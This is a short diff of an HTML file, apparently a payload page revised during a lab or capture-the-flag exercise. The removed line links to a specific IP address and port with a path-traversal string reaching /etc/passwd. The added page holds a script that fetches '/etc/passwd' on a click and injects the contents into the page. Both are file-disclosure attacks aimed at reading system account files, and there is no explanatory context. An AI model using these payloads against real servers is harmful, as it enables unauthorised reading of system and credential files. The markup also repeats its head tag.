@@ -1,11 +1,34 @@
-<!doctype html>
-<html>
+<?xml version = "1.0" encoding = "utf-8"?>
+ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
   <head>
-    <title>This is the title of the webpage!</title>
+    <head>
+      <script type="text/javascript">
+    
+        var http_request = new XMLHttpRequest();
+    
+        function makeRequest()
+        {
+          http_request.onreadystatechange = handleCheckboxRequest;
+          http_request.open('GET','/etc/passwd',true);
+          http_request.send(null);
+        }  
+    
+        function handleCheckboxRequest()
+        {     
+          if (http_request.readyState == 4 && http_request.status == 200) 
+          {
+            document.getElementById('test').innerHTML = http_request.responseText;
+          }
+        }     
+      </script>
   </head>
   <body>
-    <p>New Test2.</p>
-    <a href="https://94.237.60.139:54904/../../../../../../../../../etc/passwd">test link</a>
+    <div class="top">
+      <a href="javascript://" onclick="makeRequest()">Click Here</a>
+      <div id="test">text to be replaced</div>
+    </div>
   </body>
 </html>
-
